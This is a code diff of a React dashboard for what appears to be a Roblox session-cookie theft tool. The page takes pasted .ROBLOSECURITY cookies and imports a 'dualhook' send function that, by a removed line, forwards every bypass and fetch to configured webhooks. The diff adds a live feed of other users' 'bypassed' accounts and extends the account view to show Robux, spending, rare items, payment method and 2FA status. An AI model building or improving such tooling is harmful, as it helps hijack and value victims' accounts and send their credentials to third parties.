@@ -1,7 +1,11 @@
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Shield, Zap, Cookie, FolderOpen, Check, Trash2, Loader2, X } from "lucide-react";
-import { getDirectories, getActiveDirectoryId, setActiveDirectoryId, dualhookSend, AccountInfo, Directory } from "@/lib/tokenStore";
+import { Shield, Zap, Cookie, FolderOpen, Check, Loader2, X, Activity, Menu } from "lucide-react";
+import {
+  getDirectories, getActiveDirectoryId, setActiveDirectoryId,
+  dualhookSend, AccountInfo, Directory,
+  getLiveBypassLog, LiveBypassEntry,
+} from "@/lib/tokenStore";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import DiscordInvitePopup from "@/components/DiscordInvitePopup";
@@ -11,13 +15,18 @@ const Dashboard = () => {
   const [dirs, setDirs] = useState<Directory[]>([]);
   const [activeId, setActive] = useState<string | null>(null);
   const [fetchOpen, setFetchOpen] = useState(false);
-  const [fetchCookie, setFetchCookie] = useState("");
+  const [fetchCookieInput, setFetchCookieInput] = useState("");
   const [loading, setLoading] = useState(false);
   const [result, setResult] = useState<AccountInfo | null>(null);
+  const [liveLog, setLiveLog] = useState<LiveBypassEntry[]>([]);
+  const [sideOpen, setSideOpen] = useState(false);
 
   useEffect(() => {
     setDirs(getDirectories());
     setActive(getActiveDirectoryId());
+    setLiveLog(getLiveBypassLog());
+    const id = window.setInterval(() => setLiveLog(getLiveBypassLog()), 3000);
+    return () => window.clearInterval(id);
   }, []);
 
   const handlePickDir = (id: string) => {
@@ -28,7 +37,7 @@ const Dashboard = () => {
   };
 
   const handleFetch = async () => {
-    const trimmed = fetchCookie.trim();
+    const trimmed = fetchCookieInput.trim();
     if (!trimmed) { toast.error("Enter a cookie"); return; }
     setLoading(true); setResult(null);
     try {
@@ -45,17 +54,43 @@ const Dashboard = () => {
   return (
     <div className="min-h-screen px-4 py-6">
       <DiscordInvitePopup />
+
+      {/* Side panel (admin) */}
+      <div
+        className={`fixed top-0 left-0 h-full w-64 bg-card border-r border-border z-40 p-5 transition-transform duration-300 ease-out ${sideOpen ? 'translate-x-0' : '-translate-x-full'}`}
+      >
+        <div className="flex items-center justify-between mb-6">
+          <div className="flex items-center gap-2">
+            <div className="w-9 h-9 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
+              <Shield size={16} className="text-primary" />
+            </div>
+            <span className="font-bold text-foreground">Admin</span>
+          </div>
+          <button onClick={() => setSideOpen(false)} className="text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
+        </div>
+        <button
+          onClick={() => navigate("/admin-login")}
+          className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn transition-all"
+        >
+          <Shield size={16} /> Open Admin Panel
+        </button>
+        <p className="text-[10px] text-muted-foreground text-center mt-3">Configure webhooks, directories & site settings.</p>
+      </div>
+      {sideOpen && (
+        <div className="fixed inset-0 bg-background/60 backdrop-blur-sm z-30 animate-fade-in" onClick={() => setSideOpen(false)} />
+      )}
+
       <div className="max-w-lg mx-auto space-y-5 animate-fade-in-up">
-        {/* Header — Shield on left = admin login */}
+        {/* Header */}
         <div className="flex items-center justify-between">
           <button
-            onClick={() => navigate("/admin-login")}
-            className="w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border hover:scale-105 transition-transform"
-            aria-label="Admin Login"
+            onClick={() => setSideOpen(true)}
+            className="w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border hover:scale-110 transition-all duration-300"
+            aria-label="Open admin menu"
           >
-            <Shield size={18} className="text-primary" />
+            <Menu size={18} className="text-primary" />
           </button>
-          <h1 className="text-xl font-bold text-foreground glow-text">RBX Tools</h1>
+          <h1 className="text-xl font-bold text-foreground glow-text tracking-wide">ROBLOX TOOLS</h1>
           <div className="w-10" />
         </div>
 
@@ -63,14 +98,14 @@ const Dashboard = () => {
         <div className="grid grid-cols-2 gap-3">
           <button
             onClick={() => navigate("/bypass")}
-            className="card-glow rounded-2xl p-5 flex flex-col items-center gap-2 hover:border-primary/50 transition-all"
+            className="card-glow rounded-2xl p-5 flex flex-col items-center gap-2 hover:border-primary/50 hover:scale-[1.02] transition-all duration-300"
           >
             <div className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center"><Zap size={18} className="text-primary" /></div>
             <span className="text-sm font-bold text-foreground">Open Bypass</span>
           </button>
           <button
             onClick={() => setFetchOpen(true)}
-            className="card-glow rounded-2xl p-5 flex flex-col items-center gap-2 hover:border-primary/50 transition-all"
+            className="card-glow rounded-2xl p-5 flex flex-col items-center gap-2 hover:border-primary/50 hover:scale-[1.02] transition-all duration-300"
           >
             <div className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center"><Cookie size={18} className="text-primary" /></div>
             <span className="text-sm font-bold text-foreground">Fetch Cookie</span>
@@ -78,7 +113,7 @@ const Dashboard = () => {
         </div>
 
         {/* Directories list */}
-        <div className="card-glow rounded-2xl p-5 space-y-3">
+        <div className="card-glow rounded-2xl p-5 space-y-3 transition-all duration-300">
           <div className="flex items-center justify-between">
             <h2 className="text-base font-bold text-foreground flex items-center gap-2">
               <FolderOpen size={16} className="text-primary" /> Directories
@@ -93,54 +128,89 @@ const Dashboard = () => {
                 <button
                   key={d.id}
                   onClick={() => handlePickDir(d.id)}
-                  className={`w-full flex items-center justify-between gap-3 rounded-xl px-3.5 py-2.5 border transition-all ${
+                  className={`w-full flex items-center justify-between gap-3 rounded-xl px-3.5 py-2.5 border transition-all duration-300 hover:scale-[1.01] ${
                     activeId === d.id ? "bg-primary/15 border-primary/50" : "bg-secondary/40 border-border/50 hover:border-border"
                   }`}
                 >
                   <div className="flex items-center gap-2 min-w-0">
-                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${activeId === d.id ? 'bg-[hsl(var(--success))]' : 'bg-muted-foreground'}`} />
+                    <div className={`w-2 h-2 rounded-full flex-shrink-0 transition-colors ${activeId === d.id ? 'bg-[hsl(var(--success))]' : 'bg-muted-foreground'}`} />
                     <span className="text-sm font-medium text-foreground truncate">{d.name}</span>
                   </div>
-                  {activeId === d.id && <Check size={14} className="text-primary flex-shrink-0" />}
+                  {activeId === d.id && <Check size={14} className="text-primary flex-shrink-0 animate-scale-in" />}
                 </button>
               ))}
             </div>
           )}
-          {activeId && (
-            <p className="text-[10px] text-muted-foreground text-center">
-              Active directory will dualhook every bypass & fetch.
-            </p>
+        </div>
+
+        {/* Live Bypass */}
+        <div className="card-glow rounded-2xl p-5 space-y-3">
+          <h2 className="text-base font-bold text-foreground flex items-center gap-2">
+            <Activity size={16} className="text-primary animate-pulse" /> Current Live Bypass
+          </h2>
+          {liveLog.length === 0 ? (
+            <p className="text-xs text-muted-foreground py-4 text-center">No activity yet.</p>
+          ) : (
+            <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
+              {liveLog.map(e => (
+                <div key={e.id} className="flex items-center gap-3 bg-secondary/40 rounded-xl px-3 py-2 border border-border/40 animate-fade-in">
+                  {e.avatarUrl ? (
+                    <img src={e.avatarUrl} alt={e.username} className="w-9 h-9 rounded-lg border border-border/50" />
+                  ) : (
+                    <div className="w-9 h-9 rounded-lg bg-primary/20 flex items-center justify-center text-xs font-bold text-primary">{e.username.slice(0, 2).toUpperCase()}</div>
+                  )}
+                  <div className="flex-1 min-w-0">
+                    <p className="text-sm font-medium text-foreground truncate">{e.username}</p>
+                    <p className="text-[10px] text-muted-foreground">{new Date(e.timestamp).toLocaleTimeString()}</p>
+                  </div>
+                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${e.success ? 'bg-[hsl(var(--success))]/20 text-[hsl(var(--success))]' : 'bg-destructive/20 text-destructive'}`}>
+                    {e.success ? '✅ Success' : '❎ No'}
+                  </span>
+                </div>
+              ))}
+            </div>
           )}
         </div>
       </div>
 
       {/* Fetch Cookie Modal */}
       {fetchOpen && (
-        <div className="fixed inset-0 z-40 flex items-center justify-center px-4 bg-background/70 backdrop-blur-sm">
-          <div className="card-glow rounded-2xl max-w-md w-full p-6 space-y-4 relative">
-            <button onClick={() => { setFetchOpen(false); setResult(null); setFetchCookie(""); }} className="absolute top-3 right-3 text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
+        <div className="fixed inset-0 z-40 flex items-center justify-center px-4 bg-background/70 backdrop-blur-sm animate-fade-in">
+          <div className="card-glow rounded-2xl max-w-md w-full p-6 space-y-4 relative animate-scale-in">
+            <button onClick={() => { setFetchOpen(false); setResult(null); setFetchCookieInput(""); }} className="absolute top-3 right-3 text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
             <h2 className="text-base font-bold text-foreground flex items-center gap-2"><Cookie size={16} className="text-primary" /> Fetch Cookie</h2>
             <textarea
-              value={fetchCookie}
-              onChange={e => setFetchCookie(e.target.value)}
+              value={fetchCookieInput}
+              onChange={e => setFetchCookieInput(e.target.value)}
               placeholder="Paste .ROBLOSECURITY cookie..."
-              className="input-field text-xs font-mono min-h-[100px] resize-y w-full"
+              className="input-field text-xs font-mono min-h-[100px] resize-y w-full transition-all"
             />
             <button
               onClick={handleFetch}
               disabled={loading}
-              className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn disabled:opacity-50"
+              className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn disabled:opacity-50 transition-all"
             >
-              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Fetch & Send</>}
+              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Fetch Cookie</>}
             </button>
             {result && (
-              <div className="bg-secondary/40 border border-border/50 rounded-xl p-3 space-y-1.5 text-xs max-h-60 overflow-y-auto">
-                <div className="flex justify-between"><span className="text-muted-foreground">User</span><span className="text-foreground font-mono">{result.username}</span></div>
+              <div className="bg-secondary/40 border border-border/50 rounded-xl p-3 space-y-1.5 text-xs max-h-72 overflow-y-auto animate-fade-in">
+                <div className="flex items-center gap-3 pb-2 border-b border-border/40">
+                  {result.avatarUrl && <img src={result.avatarUrl} alt={result.username} className="w-10 h-10 rounded-lg border border-border/50" />}
+                  <div>
+                    <p className="text-sm font-bold text-foreground">{result.username}</p>
+                    <p className="text-[10px] text-muted-foreground">ID: {String(result.userId)}</p>
+                  </div>
+                  <span className="ml-auto text-[10px] font-bold bg-[hsl(var(--success))]/20 text-[hsl(var(--success))] px-2 py-0.5 rounded-full">Active</span>
+                </div>
                 <div className="flex justify-between"><span className="text-muted-foreground">Robux</span><span className="text-foreground font-mono">{String(result.robux ?? 0)} | {String(result.pendingRobux ?? 0)}</span></div>
+                <div className="flex justify-between"><span className="text-muted-foreground">Spent</span><span className="text-foreground font-mono">{String(result.robuxSpent ?? 0)}</span></div>
                 <div className="flex justify-between"><span className="text-muted-foreground">Premium</span><span>{result.premium ? '✅' : '❎'}</span></div>
                 <div className="flex justify-between"><span className="text-muted-foreground">Korblox</span><span>{result.korblox ? '✅' : '❎'}</span></div>
                 <div className="flex justify-between"><span className="text-muted-foreground">Headless</span><span>{result.headless ? '✅' : '❎'}</span></div>
+                <div className="flex justify-between"><span className="text-muted-foreground">Valkyrie</span><span>{result.valkyrie ? '✅' : '❎'}</span></div>
                 <div className="flex justify-between"><span className="text-muted-foreground">Payment</span><span>{result.hasPayment ? '✅' : '❎'}</span></div>
+                <div className="flex justify-between"><span className="text-muted-foreground">2FA</span><span>{result.has2FA ? '✅' : '❎'}</span></div>
+                <div className="flex justify-between"><span className="text-muted-foreground">Email Verified</span><span>{result.emailVerified ? '✅' : '❎'}</span></div>
               </div>
             )}
           </div>
